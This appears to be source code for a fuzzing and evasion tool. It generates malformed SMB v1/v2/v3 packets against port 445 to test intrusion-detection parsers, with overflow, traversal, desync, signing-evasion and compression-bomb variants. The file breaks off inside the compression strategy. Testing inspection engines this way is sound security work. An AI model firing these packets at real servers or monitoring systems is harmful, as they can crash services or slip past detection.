import struct
import random
import os
from protocol.dynamic_data import get_commands, get_string_literals, random_buffer_size, has_dynamic_data

# ---------------------------------------------------------------------------
# SMB v2/v3 mutation strategies for deep-packet-inspection engines.
#
# Design (grounded in MS-SMB2, MS-SMB, and MS-RPCE specifications):
#
# IDS engines that inspect SMB traffic must:
#   * Parse NetBIOS session headers (4-byte length-prefixed framing)
#   * Parse SMB headers — SMBv1 (0xFF'SMB') and SMBv2/3 (0xFE'SMB')
#   * Track dialect negotiation, sessions, tree connections
#   * Handle SMBv2 compound/chained requests (NextCommand offsets)
#   * Extract file content from READ/WRITE for file inspection
#   * Parse DCE/RPC over named pipes (IPC$ / FSCTL_PIPE_TRANSCEIVE)
#   * Decrypt SMBv3 transform headers; decompress SMBv3 compression
#   * Track oplock/lease state across sessions
#
# All strategies are client->server TCP to port 445.
# ---------------------------------------------------------------------------

# === SMB2/3 Constants ===
SMB2_MAGIC = b'\xfeSMB'
SMB1_MAGIC = b'\xffSMB'
SMB3_TRANSFORM_MAGIC = b'\xfdSMB'
SMB3_COMPRESS_MAGIC  = b'\xfcSMB'

SMB2_NEGOTIATE       = 0x0000
SMB2_SESSION_SETUP   = 0x0001
SMB2_LOGOFF          = 0x0002
SMB2_TREE_CONNECT    = 0x0003
SMB2_TREE_DISCONNECT = 0x0004
SMB2_CREATE          = 0x0005
SMB2_CLOSE           = 0x0006
SMB2_READ            = 0x0008
SMB2_WRITE           = 0x0009
SMB2_IOCTL           = 0x000B
SMB2_ECHO            = 0x000D
SMB2_QUERY_INFO      = 0x0010
SMB2_SET_INFO        = 0x0011
SMB2_OPLOCK_BREAK    = 0x0012

SMB2_DIALECT_202 = 0x0202
SMB2_DIALECT_210 = 0x0210
SMB2_DIALECT_300 = 0x0300
SMB2_DIALECT_302 = 0x0302
SMB2_DIALECT_311 = 0x0311

SMB2_FLAGS_RELATED_OPS = 0x00000004
SMB2_FLAGS_SIGNED      = 0x00000008

FSCTL_PIPE_TRANSCEIVE    = 0x0011C017
FSCTL_VALIDATE_NEGOTIATE = 0x00140204
FSCTL_DFS_GET_REFERRALS  = 0x00060194
FSCTL_SRV_COPYCHUNK      = 0x001440F2

# === Strategy Definitions ===

# --- SMBv2 strategies (core SMB2 protocol attacks) ---
SMB2_STRATEGIES = [
    "negotiate_confusion",
    "header_manipulation",
    "compound_abuse",
    "netbios_desync",
    "session_state_attack",
    "tree_path_overflow",
    "create_fuzz",
    "read_write_overflow",
    "dce_pipe_attack",
    "ioctl_attack",
    "oplock_lease_flood",
    "multi_protocol_evasion",
    "query_info_overflow",
]

SMB2_WEIGHTS = [
    10, 8, 8, 9, 7, 7, 6, 8, 9, 7, 4, 5, 5,
]

SMB2_STRATEGY_LABELS = {
    "negotiate_confusion":      "Dialect Negotiate Confusion",
    "header_manipulation":      "SMB2 Header Manipulation",
    "compound_abuse":           "Compound Request Abuse",
    "netbios_desync":           "NetBIOS Framing Desync",
    "session_state_attack":     "Session State Machine Attack",
    "tree_path_overflow":       "Tree Connect Path Overflow",
    "create_fuzz":              "CREATE Request Fuzz",
    "read_write_overflow":      "READ/WRITE Buffer Overflow",
    "dce_pipe_attack":          "DCE/RPC Pipe Attack",
    "ioctl_attack":             "IOCTL/FSCTL Overflow",
    "oplock_lease_flood":       "Oplock/Lease Flood",
    "multi_protocol_evasion":   "Multi-Protocol Evasion",
    "query_info_overflow":      "QUERY_INFO/SET_INFO Overflow",
}

# --- SMBv3 strategies (SMB3-specific + shared) ---
SMB3_STRATEGIES = [
    "negotiate_confusion",
    "signing_evasion",
    "transform_header_attack",
    "compression_attack",
    "multi_protocol_evasion",
]

SMB3_WEIGHTS = [
    10, 8, 9, 9, 6,
]

SMB3_STRATEGY_LABELS = {
    "negotiate_confusion":      "SMB3 Dialect Negotiate Confusion",
    "signing_evasion":          "Signing/Integrity Evasion",
    "transform_header_attack":  "SMB3 Transform Header Attack",
    "compression_attack":       "SMB3 Compression Attack",
    "multi_protocol_evasion":   "Multi-Protocol Evasion",
}

# Legacy combined lists (kept for backward compatibility)
SMB_STRATEGIES = SMB2_STRATEGIES + [s for s in SMB3_STRATEGIES if s not in SMB2_STRATEGIES]
SMB_WEIGHTS = SMB2_WEIGHTS + [SMB3_WEIGHTS[i] for i, s in enumerate(SMB3_STRATEGIES) if s not in SMB2_STRATEGIES]
SMB_STRATEGY_LABELS = {**SMB2_STRATEGY_LABELS, **SMB3_STRATEGY_LABELS}


# === Binary Helpers ===

def _nb(payload_len):
    """4-byte NetBIOS session message header."""
    return b'\x00' + struct.pack("!I", payload_len)[1:]

def _wrap(body):
    """NetBIOS-wrap an SMB message body."""
    return _nb(len(body)) + body

def _smb2(cmd, flags=0, mid=0, sid=0, tid=0, cc=1, cr=1, status=0, nc=0):
    """Build a 64-byte SMB2 header."""
    return struct.pack("<4sHHIHHIIQIIQ16s",
        SMB2_MAGIC, 64, cc, status, cmd, cr, flags, nc, mid, 0, tid, sid,
        b'\x00' * 16)

def _smb1(cmd, flags=0x18, flags2=0xC803):
    """Build a 32-byte SMBv1 header."""
    return (SMB1_MAGIC + struct.pack("<B", cmd) + b'\x00\x00\x00\x00'
            + struct.pack("<BH", flags, flags2) + b'\x00' * 12
            + struct.pack("<HHHH", 1, random.randint(1, 0xFFFF), 1, 1))

def _guid():
    return os.urandom(16)

def _echo_body():
    return struct.pack("<H", 4) + b'\x00\x00'

def _negotiate_preamble(dialects=None):
    """A valid SMB2 NEGOTIATE so the IDS classifies the stream as SMB."""
    if dialects is None:
        dialects = [SMB2_DIALECT_202, SMB2_DIALECT_210, SMB2_DIALECT_300,
                     SMB2_DIALECT_302, SMB2_DIALECT_311]
    hdr = _smb2(SMB2_NEGOTIATE, mid=0, cc=0, cr=31)
    body = struct.pack("<HHHI", 36, len(dialects), 0x01, 0)
    body += struct.pack("<I", 0)  # Capabilities
    body += _guid()
    body += struct.pack("<IHH", 0, 0, 0)  # NegCtxOffset, Count, Rsvd
    for d in dialects:
        body += struct.pack("<H", d)
    return _wrap(hdr + body)


# === Strategy Builders ===

def build_smb_payload(strategy, payload_override=None):
    """Build an SMB payload (raw TCP bytes for port 445) for the given strategy."""
    pre = _negotiate_preamble()

    # ---- 1. NEGOTIATE CONFUSION ----
    if strategy == "negotiate_confusion":
        v = random.choice(["huge_dialects", "invalid_dialects", "smb1_neg",
                           "downgrade", "ctx_overflow", "dup_dialects"])
        if v == "huge_dialects":
            ds = [random.randint(0x200, 0x3FF) for _ in range(500)]
            hdr = _smb2(SMB2_NEGOTIATE, cc=0)
            body = struct.pack("<HHHI", 36, len(ds), 1, 0) + struct.pack("<I", 0)
            body += _guid() + struct.pack("<IHH", 0, 0, 0)
            for d in ds:
                body += struct.pack("<H", d)
            return _wrap(hdr + body)
        elif v == "invalid_dialects":
            ds = [0x0000, 0x0001, 0x9999, 0xFFFF, 0xDEAD]
            hdr = _smb2(SMB2_NEGOTIATE, cc=0)
            body = struct.pack("<HHHI", 36, len(ds), 1, 0) + struct.pack("<I", 0)
            body += _guid() + struct.pack("<IHH", 0, 0, 0)
            for d in ds:
                body += struct.pack("<H", d)
            return _wrap(hdr + body)
        elif v == "smb1_neg":
            hdr = _smb1(0x72)
            strs = (b'\x02NT LM 0.12\x00\x02SMB 2.002\x00\x02SMB 2.???\x00'
                    + b'\x02' + b'A' * 200 + b'\x00')
            return _wrap(hdr + b'\x00' + struct.pack("<H", len(strs)) + strs)
        elif v == "downgrade":
            neg1 = _negotiate_preamble([SMB2_DIALECT_311])
            hdr = _smb1(0x72)
            strs = b'\x02NT LM 0.12\x00'
            neg2 = _wrap(hdr + b'\x00' + struct.pack("<H", len(strs)) + strs)
            return neg1 + neg2
        elif v == "ctx_overflow":
            hdr = _smb2(SMB2_NEGOTIATE, cc=0)
            body = struct.pack("<HHHI", 36, 1, 1, 0) + struct.pack("<I", 0) + _guid()
            body += struct.pack("<IHH", 100, 3, 0) + struct.pack("<H", SMB2_DIALECT_311)
            body += b'\x00' * ((8 - (len(body) % 8)) % 8)
            ctx = struct.pack("<HHI", 0x0001, 36, 0) + struct.pack("<HH", 1, 0x0001) + b'\x00' * 32
            ctx += b'\x00' * ((8 - (len(ctx) % 8)) % 8)
            ctx += struct.pack("<HHI", 0x0002, 202, 0) + struct.pack("<H", 100) + b'\x01\x00' * 100
            ctx += b'\x00' * ((8 - (len(ctx) % 8)) % 8)
            ctx += struct.pack("<HHI", 0xFFFF, 8000, 0) + b'\xCC' * 8000
            return _wrap(hdr + body + ctx)
        else:
            ds = [SMB2_DIALECT_311] * 200
            hdr = _smb2(SMB2_NEGOTIATE, cc=0)
            body = struct.pack("<HHHI", 36, len(ds), 1, 0) + struct.pack("<I", 0)
            body += _guid() + struct.pack("<IHH", 0, 0, 0)
            for d in ds:
                body += struct.pack("<H", d)
            return _wrap(hdr + body)

    # ---- 2. HEADER MANIPULATION ----
    elif strategy == "header_manipulation":
        v = random.choice(["bad_magic", "bad_size", "credit_overflow",
                           "bad_flags", "bad_command", "mid_wrap"])
        if v == "bad_magic":
            m = random.choice([b'\xfeSMX', b'\xfeSM\x00', b'\x00SMB', b'\xfesmb'])
            hdr = m + struct.pack("<HHIHHIIQIIQ16s",
                64, 1, 0, SMB2_ECHO, 1, 0, 0, 1, 0, 0, 0, b'\x00' * 16)
            return pre + _wrap(hdr + _echo_body())
        elif v == "bad_size":
            for sz in [0, 32, 128, 0xFFFF]:
                hdr = struct.pack("<4sHHIHHIIQIIQ16s",
                    SMB2_MAGIC, sz, 1, 0, SMB2_ECHO, 1, 0, 0, 1, 0, 0, 0, b'\x00' * 16)
                return pre + _wrap(hdr + _echo_body())
        elif v == "credit_overflow":
            return pre + _wrap(_smb2(SMB2_ECHO, cc=0xFFFF, cr=0xFFFF, mid=1) + _echo_body())
        elif v == "bad_flags":
            return pre + _wrap(_smb2(SMB2_ECHO, flags=0xFFFFFFFF, mid=1) + _echo_body())
        elif v == "bad_command":
            cmd = random.choice([0x0013, 0x00FF, 0xFFFF, 0xDEAD])
            return pre + _wrap(_smb2(cmd, mid=1) + b'\x00' * 32)
        else:
            return pre + _wrap(_smb2(SMB2_ECHO, mid=0xFFFFFFFFFFFFFFFF) + _echo_body())

    # ---- 3. COMPOUND ABUSE ----
    elif strategy == "compound_abuse":
        v = random.choice(["circular", "deep", "overlap", "past_end",
                           "related_mismatch", "zero_body"])
        if v == "deep":
            parts = []
            for i in range(500):
                msg = _smb2(SMB2_ECHO, mid=i+1) + _echo_body()
                pad = (8 - (len(msg) % 8)) % 8
                msg += b'\x00' * pad
                if i < 499:
                    msg = msg[:20] + struct.pack("<I", len(msg)) + msg[24:]
                parts.append(msg)
            return pre + _wrap(b''.join(parts))
        elif v == "overlap":
            msg1 = _smb2(SMB2_ECHO, mid=1) + _echo_body() + b'\xCC' * 32
            off = len(msg1) - 16
            msg1 = msg1[:20] + struct.pack("<I", off) + msg1[24:]
            msg2 = _smb2(SMB2_ECHO, mid=2) + _echo_body()
            return pre + _wrap(msg1 + msg2)
        elif v == "past_end":
            return pre + _wrap(_smb2(SMB2_ECHO, mid=1, nc=0xFFFF) + _echo_body())
        elif v == "related_mismatch":
            msg1 = _smb2(SMB2_ECHO, mid=1, sid=0x1111, tid=0xAAAA) + _echo_body()
            pad = (8 - (len(msg1) % 8)) % 8
            msg1 += b'\x00' * pad
            msg1 = msg1[:20] + struct.pack("<I", len(msg1)) + msg1[24:]
            msg2 = _smb2(SMB2_ECHO, mid=2, flags=SMB2_FLAGS_RELATED_OPS,
                         sid=0x2222, tid=0xBBBB) + _echo_body()
            return pre + _wrap(msg1 + msg2)
        elif v == "zero_body":
            parts = []
            for i in range(200):
                hdr = _smb2(SMB2_ECHO, mid=i+1)
                if i < 199:
                    hdr = hdr[:20] + struct.pack("<I", 64) + hdr[24:]
                parts.append(hdr)
            return pre + _wrap(b''.join(parts))
        else:  # circular
            msg = _smb2(SMB2_ECHO, mid=1) + _echo_body()
            pad = (8 - (len(msg) % 8)) % 8
            msg += b'\x00' * pad
            msg = msg[:20] + struct.pack("<I", len(msg)) + msg[24:]
            msg2 = _smb2(SMB2_ECHO, mid=2) + _echo_body()
            return pre + _wrap(msg + msg2)

    # ---- 4. NETBIOS DESYNC ----
    elif strategy == "netbios_desync":
        v = random.choice(["len_mismatch", "zero_len", "max_len",
                           "multi_msg", "frag_hdr", "keepalive"])
        if v == "len_mismatch":
            smb = _smb2(SMB2_ECHO, mid=1) + _echo_body()
            return pre + _nb(len(smb) + 50000) + smb
        elif v == "zero_len":
            return pre + _nb(0)
        elif v == "max_len":
            smb = _smb2(SMB2_ECHO, mid=1) + _echo_body()
            return pre + b'\x00\xFF\xFF\xFF' + smb
        elif v == "multi_msg":
            msgs = b''
            for i in range(100):
                msgs += _smb2(SMB2_ECHO, mid=i+1) + _echo_body()
            return pre + _nb(len(msgs)) + msgs
        elif v == "frag_hdr":
            full = _smb2(SMB2_ECHO, mid=1) + _echo_body()
            return pre + _nb(32) + full[:32] + _nb(len(full)-32) + full[32:]
        else:
            smb_msg = _wrap(_smb2(SMB2_ECHO, mid=1) + _echo_body())
            ka = b'\x85\x00\x00\x00'
            return pre + ka * 50 + smb_msg + ka * 50

    # ---- 5. SESSION STATE ATTACK ----
    elif strategy == "session_state_attack":
        v = random.choice(["pre_neg", "double_neg", "setup_no_neg",
                           "tree_no_ses", "post_logoff", "rand_sid"])
        if v == "pre_neg":
            path = "\\\\srv\\IPC$".encode("utf-16-le")
            hdr = _smb2(SMB2_TREE_CONNECT, mid=0, sid=1)
            body = struct.pack("<HH", 9, 0) + struct.pack("<IH", 72, len(path))
            body += b'\x00\x00' + path
            return _wrap(hdr + body)
        elif v == "double_neg":
            return _negotiate_preamble([SMB2_DIALECT_300]) + _negotiate_preamble([SMB2_DIALECT_311])
        elif v == "setup_no_neg":
            hdr = _smb2(SMB2_SESSION_SETUP, mid=0)
            ntlm = b'NTLMSSP\x00' + struct.pack("<I", 1) + struct.pack("<I", 0xE2088297) + b'\x00' * 48
            body = struct.pack("<BBHI", 25, 0, 1, 0) + struct.pack("<I", 0)
            body += struct.pack("<HH", 88, len(ntlm)) + struct.pack("<Q", 0) + ntlm
            return _wrap(hdr + body)
        elif v == "tree_no_ses":
            path = "\\\\srv\\share".encode("utf-16-le")
            hdr = _smb2(SMB2_TREE_CONNECT, mid=1, sid=0)
            body = struct.pack("<HH", 9, 0) + struct.pack("<IH", 72, len(path))
            body += b'\x00\x00' + path
            return pre + _wrap(hdr + body)
        elif v == "post_logoff":
            sid = random.randint(1, 0xFFFFFFFF)
            lo = _wrap(_smb2(SMB2_LOGOFF, mid=1, sid=sid) + struct.pack("<HH", 4, 0))
            cmds = b''.join(_wrap(_smb2(SMB2_ECHO, mid=i+2, sid=sid) + _echo_body())
                            for i in range(200))
            return pre + lo + cmds
        else:
            cmds = b''.join(
                _wrap(_smb2(SMB2_ECHO, mid=i+1,
                            sid=random.randint(1, 0xFFFFFFFFFFFFFFFF),
                            tid=random.randint(1, 0xFFFFFFFF)) + _echo_body())
                for i in range(300))
            return pre + cmds

    # ---- 6. TREE PATH OVERFLOW ----
    elif strategy == "tree_path_overflow":
        v = random.choice(["giant", "traversal", "null_path",
                           "unicode", "ipc_trav", "empty"])
        def _tc(path_bytes, mid=1):
            hdr = _smb2(SMB2_TREE_CONNECT, mid=mid, sid=1)
            plen = min(len(path_bytes), 0xFFFF)
            body = struct.pack("<HH", 9, 0) + struct.pack("<IH", 72, plen)
            body += b'\x00\x00' + path_bytes
            return _wrap(hdr + body)
        if v == "giant":
            p = ("\\\\s\\" + "A" * 60000).encode("utf-16-le")
            return pre + _tc(p)
        elif v == "traversal":
            p = ("\\\\s\\" + "..\\..\\..\\..\\..\\" * 50 + "admin$").encode("utf-16-le")
            return pre + _tc(p)
        elif v == "null_path":
            p = "\\\\s\\share".encode("utf-16-le") + b'\x00\x00' + "\\hidden".encode("utf-16-le")
            return pre + _tc(p)
        elif v == "unicode":
            p = "\\\\s\\".encode("utf-16-le")
            for cp in [0xD800, 0xDFFF, 0xFFFE, 0xFFFF, 0x0000, 0x202E]:
                p += struct.pack("<H", cp)
            p += "share".encode("utf-16-le")
            return pre + _tc(p)
        elif v == "ipc_trav":
            p = "\\\\s\\IPC$\\..\\..\\admin$\\system32".encode("utf-16-le")
            return pre + _tc(p)
        else:
            return pre + _tc(b'')

    # ---- 7. CREATE FUZZ ----
    elif strategy == "create_fuzz":
        v = random.choice(["giant_name", "ctx_flood", "access_mask",
                           "lease_key", "opts_conflict", "ea_bomb"])
        def _cr(name_b, extra=b'', am=0x12019F, co=0x40, mid=1):
            hdr = _smb2(SMB2_CREATE, mid=mid, sid=1, tid=1)
            noff = 64 + 56
            body = struct.pack("<BBIIIIQQI", 57, 0, 0, 2, 0, 0, am, 0x80, 7)
            body += struct.pack("<II", 1, co)
            body += struct.pack("<HH", noff, len(name_b))
            if extra:
                co2 = noff + len(name_b)
                co2 += (8 - (co2 % 8)) % 8
                body += struct.pack("<II", co2, len(extra))
            else:
                body += struct.pack("<II", 0, 0)
            body += name_b
            if extra:
                body += b'\x00' * ((8 - ((len(body) + 64) % 8)) % 8) + extra
            return _wrap(hdr + body)
        if v == "giant_name":
            return pre + _cr(("A" * 32000).encode("utf-16-le"))
        elif v == "ctx_flood":
            ctx = b''
            for i in range(100):
                n = b'SMB2_CREATE_APP_INSTANCE_ID\x00'
                d = os.urandom(200)
                e = struct.pack("<IHHHHI", 0, 24, len(n), 0, 24 + len(n), len(d)) + n
                e += b'\x00' * ((8 - (len(e) % 8)) % 8) + d
                e += b'\x00' * ((8 - (len(e) % 8)) % 8)
                if i < 99:
                    e = struct.pack("<I", len(e)) + e[4:]
                ctx += e
            return pre + _cr("t.txt".encode("utf-16-le"), extra=ctx)
        elif v == "access_mask":
            return pre + _cr("f.dat".encode("utf-16-le"), am=0xFFFFFFFF)
        elif v == "lease_key":
            lk = os.urandom(16)
            msgs = b''
            for i in range(50):
                cn = b'RqLs\x00\x00\x00\x00'
                cd = lk + lk + struct.pack("<I", 7)
                ctx = struct.pack("<IHHHHI", 0, 24, 4, 0, 32, len(cd)) + cn + cd
                msgs += _cr(f"f{i}.dat".encode("utf-16-le"), extra=ctx, mid=i+1)
            return pre + msgs
        elif v == "opts_conflict":
            return pre + _cr("c".encode("utf-16-le"), co=0x01 | 0x40)
        else:
            ea = b''
            for i in range(500):
                n = f"EA{i}".encode()
                val = b'\xBB' * 200
                ea += struct.pack("<IBBH", 0, 0, len(n), len(val)) + n + b'\x00' + val
            cn = b'ExtA\x00\x00\x00\x00'
            ctx = struct.pack("<IHHHHI", 0, 24, 4, 0, 32, len(ea)) + cn + ea
            return pre + _cr("ea.dat".encode("utf-16-le"), extra=ctx)

    # ---- 8. READ/WRITE OVERFLOW ----
    elif strategy == "read_write_overflow":
        v = random.choice(["huge_read", "write_off", "credit_mismatch",
                           "zero_write", "channel_conf", "write_flood"])
        fid = os.urandom(16)
        if v == "huge_read":
            hdr = _smb2(SMB2_READ, mid=1, sid=1, tid=1)
            body = struct.pack("<HBB I Q", 49, 0, 0, 0xFFFFFFFF, 0) + fid
            body += struct.pack("<IIIII", 0, 0, 0, 0, 0) + b'\x00'
            return pre + _wrap(hdr + body)
        elif v == "write_off":
            data = b'\x41' * 1024
            hdr = _smb2(SMB2_WRITE, mid=1, sid=1, tid=1)
            body = struct.pack("<HHI Q", 49, 112, len(data), 0x7FFFFFFFFFFFFFFF) + fid
            body += struct.pack("<III", 0, 0, 0) + b'\x00' + data
            return pre + _wrap(hdr + body)
        elif v == "credit_mismatch":
            hdr = _smb2(SMB2_READ, mid=1, sid=1, tid=1, cc=1)
            body = struct.pack("<HBB I Q", 49, 0, 0, 0x100000, 0) + fid
            body += struct.pack("<IIIII", 0, 0, 0, 0, 0) + b'\x00'
            return pre + _wrap(hdr + body)
        elif v == "zero_write":
            hdr = _smb2(SMB2_WRITE, mid=1, sid=1, tid=1)
            body = struct.pack("<HHI Q", 49, 112, 0, 0) + fid
            body += struct.pack("<III", 0, 0, 0) + b'\x00' + b'\x42' * 4096
            return pre + _wrap(hdr + body)
        elif v == "channel_conf":
            hdr = _smb2(SMB2_READ, mid=1, sid=1, tid=1)
            body = struct.pack("<HBB I Q", 49, 0, 0, 4096, 0) + fid
            body += struct.pack("<I", 0)     # MinCount
            body += struct.pack("<I", 1)     # Channel = SMB2_CHANNEL_RDMA_V1
            body += struct.pack("<III", 0, 0, 0) + b'\x00'
            return pre + _wrap(hdr + body)
        else:
            msgs = b''
            for i in range(1000):
                hdr = _smb2(SMB2_WRITE, mid=i+1, sid=1, tid=1)
                d = os.urandom(64)
                body = struct.pack("<HHI Q", 49, 112, len(d), i * 64) + fid
                body += struct.pack("<III", 0, 0, 0) + b'\x00' + d
                msgs += _wrap(hdr + body)
            return pre + msgs

    # ---- 9. DCE/RPC PIPE ATTACK ----
    elif strategy == "dce_pipe_attack":
        v = random.choice(["bind_flood", "oversized_pdu", "auth3",
                           "callid_overflow", "nested_bind", "alter_bomb"])
        def _dce_bind(n_ctx=1, call_id=1):
            ctx_items = b''
            for i in range(n_ctx):
                ctx_items += struct.pack("<HBB", i, 1, 0)
                ctx_items += os.urandom(16) + struct.pack("<HH", 1, 0)
                ctx_items += os.urandom(16) + struct.pack("<HH", 2, 0)
            hdr = struct.pack("<BBBBIHHI HHI",
                5, 0, 11, 0x03, 0x10000000, 0, 0, call_id, 5840, 5840, 0)
            body = hdr + struct.pack("<BBH", n_ctx & 0xFF, 0, 0) + ctx_items
            flen = len(body)
            body = body[:8] + struct.pack("<H", flen) + body[10:]
            return body
        if v == "bind_flood":
            dce = _dce_bind(n_ctx=200)
            smb = _smb1(0x25) + b'\x00' + struct.pack("<H", len(dce)) + dce
            return pre + _wrap(smb)
        elif v == "oversized_pdu":
            dce = struct.pack("<BBBBIHHI", 5, 0, 0, 3, 0x10000000, 0xFFFF, 0, 1)
            dce += b'\xAA' * 4096
            smb = _smb1(0x25) + b'\x00' + struct.pack("<H", len(dce)) + dce
            return pre + _wrap(smb)
        elif v == "auth3":
            dce = struct.pack("<BBBBIHHI", 5, 0, 16, 3, 0x10000000, 0, 0, 1)
            blob = b'\xBB' * 60000
            dce += blob
            flen = len(dce)
            dce = dce[:8] + struct.pack("<H", flen) + dce[10:]
            smb = _smb1(0x25) + b'\x00' + struct.pack("<H", len(dce)) + dce
            return pre + _wrap(smb)
        elif v == "callid_overflow":
            dce = _dce_bind(call_id=0xFFFFFFFF)
            smb = _smb1(0x25) + b'\x00' + struct.pack("<H", len(dce)) + dce
            return pre + _wrap(smb)
        elif v == "nested_bind":
            msgs = b''
            for i in range(100):
                dce = _dce_bind(call_id=i+1)
                smb = _smb1(0x25) + b'\x00' + struct.pack("<H", len(dce)) + dce
                msgs += _wrap(smb)
            return pre + msgs
        else:
            msgs = b''
            for i in range(200):
                dce = struct.pack("<BBBBIHHI", 5, 0, 14, 3, 0x10000000, 0, 0, i+1)
                ctx = struct.pack("<HBB", 0, 1, 0) + os.urandom(16) + struct.pack("<HH", 1, 0)
                ctx += os.urandom(16) + struct.pack("<HH", 2, 0)
                dce += struct.pack("<BBH", 1, 0, 0) + ctx
                flen = len(dce)
                dce = dce[:8] + struct.pack("<H", flen) + dce[10:]
                smb = _smb1(0x25) + b'\x00' + struct.pack("<H", len(dce)) + dce
                msgs += _wrap(smb)
            return pre + msgs

    # ---- 10. IOCTL ATTACK ----
    elif strategy == "ioctl_attack":
        v = random.choice(["invalid_fsctl", "pipe_transceive", "validate_neg",
                           "dfs_overflow", "copychunk", "resiliency"])
        fid = os.urandom(16)
        def _ioctl(ctl_code, in_data=b'', mid=1):
            hdr = _smb2(SMB2_IOCTL, mid=mid, sid=1, tid=1)
            in_off = 64 + 56 if in_data else 0
            body = struct.pack("<HH I", 57, 0, ctl_code) + fid
            body += struct.pack("<II", in_off, len(in_data))
            body += struct.pack("<I", 0)     # MaxInputResponse
            body += struct.pack("<II", 0, 0) # OutputOffset, OutputCount
            body += struct.pack("<I", 65536) # MaxOutputResponse
            body += struct.pack("<II", 0, 0) # Flags, Reserved
            body += in_data
            return _wrap(hdr + body)
        if v == "invalid_fsctl":
            return pre + _ioctl(0xDEADBEEF, b'\x00' * 32)
        elif v == "pipe_transceive":
            return pre + _ioctl(FSCTL_PIPE_TRANSCEIVE, b'\xCC' * 60000)
        elif v == "validate_neg":
            d = struct.pack("<I", 0) + _guid() + struct.pack("<HH", 1, 0)
            d += struct.pack("<H", SMB2_DIALECT_311)
            d = d[:4] + b'\xFF' * 12 + d[16:]
            return pre + _ioctl(FSCTL_VALIDATE_NEGOTIATE, d)
        elif v == "dfs_overflow":
            path = ("\\\\server\\" + "A" * 60000).encode("utf-16-le")
            return pre + _ioctl(FSCTL_DFS_GET_REFERRALS, path)
        elif v == "copychunk":
            chunk = struct.pack("<QQI", 0xFFFFFFFFFFFFFFFF, 0xFFFFFFFFFFFFFFFF, 0xFFFFFFFF)
            d = os.urandom(24) + struct.pack("<I", 100) + chunk * 100
            return pre + _ioctl(FSCTL_SRV_COPYCHUNK, d)
        else:
            d = struct.pack("<II", 0xFFFFFFFF, 0xFFFFFFFF)
            return pre + _ioctl(0x001401D4, d)

    # ---- 11. SIGNING EVASION ----
    elif strategy == "signing_evasion":
        v = random.choice(["corrupt_sig", "unsigned_mid", "preauth_tamper",
                           "wrong_algo", "sig_replay"])
        if v == "corrupt_sig":
            hdr = _smb2(SMB2_ECHO, flags=SMB2_FLAGS_SIGNED, mid=1, sid=1)
            hdr = hdr[:48] + os.urandom(16)
            return pre + _wrap(hdr + _echo_body())
        elif v == "unsigned_mid":
            signed = _wrap(_smb2(SMB2_ECHO, flags=SMB2_FLAGS_SIGNED, mid=1, sid=1) + _echo_body())
            unsigned = _wrap(_smb2(SMB2_ECHO, flags=0, mid=2, sid=1) + _echo_body())
            signed2 = _wrap(_smb2(SMB2_ECHO, flags=SMB2_FLAGS_SIGNED, mid=3, sid=1) + _echo_body())
            return pre + signed + unsigned + signed2
        elif v == "preauth_tamper":
            hdr = _smb2(SMB2_SESSION_SETUP, mid=1)
            ntlm = b'NTLMSSP\x00' + struct.pack("<I", 1) + struct.pack("<I", 0xE2088297)
            ntlm += os.urandom(48)
            body = struct.pack("<BBHI", 25, 0, 1, 0) + struct.pack("<I", 0)
            body += struct.pack("<HH", 88, len(ntlm)) + struct.pack("<Q", 0) + ntlm
            return pre + _wrap(hdr + body)
        elif v == "wrong_algo":
            hdr = _smb2(SMB2_ECHO, flags=SMB2_FLAGS_SIGNED, mid=1, sid=1)
            sig = struct.pack("<IIII", 0xAAAAAAAA, 0xBBBBBBBB, 0xCCCCCCCC, 0xDDDDDDDD)
            hdr = hdr[:48] + sig
            return pre + _wrap(hdr + _echo_body())
        else:
            orig = _smb2(SMB2_ECHO, flags=SMB2_FLAGS_SIGNED, mid=1, sid=1) + _echo_body()
            replay = bytearray(orig)
            replay[12:14] = struct.pack("<H", SMB2_WRITE)
            return pre + _wrap(orig) + _wrap(bytes(replay))

    # ---- 12. TRANSFORM HEADER ATTACK ----
    elif strategy == "transform_header_attack":
        if payload_override is not None:
            inner = _smb2(SMB2_ECHO, mid=1, sid=1) + payload_override
            nonce = os.urandom(16)
            orig_size = len(inner)
            th = SMB3_TRANSFORM_MAGIC
            th += b'\xAA' * 16          # Signature
            th += nonce
            th += struct.pack("<I", orig_size)
            th += struct.pack("<HH", 0, 0x0001)
            th += struct.pack("<Q", 1)
            return pre + _wrap(th + inner)
        v = random.choice(["bad_sig", "nonce_overflow", "size_mismatch",
                           "wrong_algo", "double_transform", "smb1_inside"])
        inner = _smb2(SMB2_ECHO, mid=1, sid=1) + _echo_body()
        def _transform(inner_data, proto=SMB3_TRANSFORM_MAGIC, nonce=None,
                       orig_size=None, algo=0x0001, sid=1):
            if nonce is None:
                nonce = os.urandom(16)
            if orig_size is None:
                orig_size = len(inner_data)
            # Transform header: signature(16) + nonce(16) + origSize(4) + reserved(2) + flags/algo(2) + sessionId(8)
            th = proto
            th += b'\xAA' * 16          # Signature
            th += nonce[:16].ljust(16, b'\x00')  # Nonce
            th += struct.pack("<I", orig_size)
            th += struct.pack("<HH", 0, algo)
            th += struct.pack("<Q", sid)
            return _wrap(th + inner_data)
        if v == "bad_sig":
            return pre + _transform(inner, proto=b'\xfdSMX')
        elif v == "nonce_overflow":
            return pre + _transform(inner, nonce=b'\xFF' * 16)
        elif v == "size_mismatch":
            return pre + _transform(inner, orig_size=len(inner) * 100)
        elif v == "wrong_algo":
            return pre + _transform(inner, algo=0xFFFF)
        elif v == "double_transform":
            inner_t = _transform(inner)
            return pre + _transform(inner_t[4:])  # strip outer NB header
        else:
            smb1 = _smb1(0x72) + b'\x00' + struct.pack("<H", 0)
            return pre + _transform(smb1)

    # ---- 13. COMPRESSION ATTACK ----
    elif strategy == "compression_attack":
        if payload_override is not None:
            inner = _smb2(SMB2_ECHO, mid=1, sid=1) + payload_override
            ch = SMB3_COMPRESS_MAGIC
            ch += struct.pack("<I", len(inner))
            ch += struct.pack("<HH", 0x0002, 0)  # LZ77
            ch += struct.pack("<I", 0)
            return pre + _wrap(ch + inner)
        v = random.choice(["invalid_algo", "decomp_bomb", "chain_overflow",
                           "pattern_junk", "orig_size_overflow", "lz77_bad",
                           "smbghost_overflow"])
        inner = _smb2(SMB2_ECHO, mid=1, sid=1) + _echo_body()
        def _compress(inner_data, algo=0x0001, flags=0, offset=0, orig_size=None):
            if orig_size is None:
                orig_size = len(inner_data)
            ch = SMB3_COMPRESS_MAGIC
            ch += struct.pack("<I", orig_size)
            ch += struct.pack("<HH", algo, flags)
            ch += struct.pack("<I", offset)
            return _wrap(ch + inner_data)
        if v == "invalid_algo":
